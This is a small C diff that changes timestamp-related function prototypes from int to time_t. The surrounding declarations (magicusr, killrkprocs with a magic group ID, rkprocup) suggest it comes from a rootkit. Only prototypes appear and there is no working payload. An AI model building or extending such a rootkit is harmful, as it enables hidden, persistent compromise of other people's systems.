@@ -14,10 +14,10 @@ void dorolf(void){
     printf("\033[1;31m%s\033[0m\n", randrolf);
 }
 
-int getlasttime(const char *timepath);
-int writenewtime(const char *timepath, int curtime);
-int timediff(const char *timepath, int curtime);
-int itistime(const char *timepath, int curtime, int timer);
+time_t getlasttime(const char *timepath);
+int writenewtime(const char *timepath, time_t curtime);
+time_t timediff(const char *timepath, time_t curtime);
+int itistime(const char *timepath, time_t curtime, time_t timer);
 int magicusr(void);
 void killrkprocs(gid_t magicgid);
 int rkprocup(void);
